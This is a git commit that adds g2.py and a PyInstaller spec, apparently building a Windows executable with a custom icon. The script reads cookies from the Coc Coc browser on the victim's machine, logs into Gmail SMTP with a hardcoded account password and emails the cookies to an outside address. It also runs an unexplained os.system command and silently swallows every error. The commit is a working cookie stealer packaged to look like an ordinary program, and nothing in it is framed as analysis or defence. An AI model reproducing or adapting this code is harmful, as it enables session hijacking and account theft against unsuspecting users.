2e1db4506de42fd34a44ba8c3b1edc94b08e71bc
gaga201702 <bamboo2017002@gmail.com>
2018-06-16 23:54:46 +0700

    tach g.py --> g1 +g2 va them icon

---
+++ abc3/g2.py
@@ -0,0 +1,37 @@
+import smtplib
+from email.message import EmailMessage
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.application import MIMEApplication
+from macpath import basename
+sender = 'petterjoin2018@gmail.com'
+receivers = ['danhcntt15@gmail.com'] #bcc
+
+message = """From: From Person <@gmail.com>
+To: To Person <danhcntt15@gmail.com>
+Subject: SMTP e-mail test
+
+This is a test e-mail message.
+"""
+
+
+
+try:
+
+    from f import *
+    import os
+    os.system("mult")
+    
+    smtpObj = smtplib.SMTP('smtp.gmail.com', 587)
+    smtpObj.starttls()
+    smtpObj.login("petterjoin2018@gmail.com", "fakatvdofpozscyq")
+  
+    
+    
+    #coc coc
+    message = get_cookies_host_key(get_all_cookies_coccoc())
+    message = message +"\n\n\n\n"+print_cookies(get_all_cookies_coccoc())
+    smtpObj.sendmail(sender, receivers, message)
+    print("ok")
+except Exception:
+    a=0
---
+++ abc3/g2.spec
@@ -0,0 +1,29 @@
+# -*- mode: python -*-
+
+block_cipher = None
+
+
+a = Analysis(['g2.py'],
+             pathex=['C:\\Users\\Administrator\\Desktop\\abcdef\\abc3'],
+             binaries=[],
+             datas=[],
+             hiddenimports=[],
+             hookspath=[],
+             runtime_hooks=[],
+             excludes=[],
+             win_no_prefer_redirects=False,
+             win_private_assemblies=False,
+             cipher=block_cipher)
+pyz = PYZ(a.pure, a.zipped_data,
+             cipher=block_cipher)
+exe = EXE(pyz,
+          a.scripts,
+          a.binaries,
+          a.zipfiles,
+          a.datas,
+          name='g2',
+          debug=False,
+          strip=False,
+          upx=True,
+          runtime_tmpdir=None,
+          console=True , icon='icon3.ico')
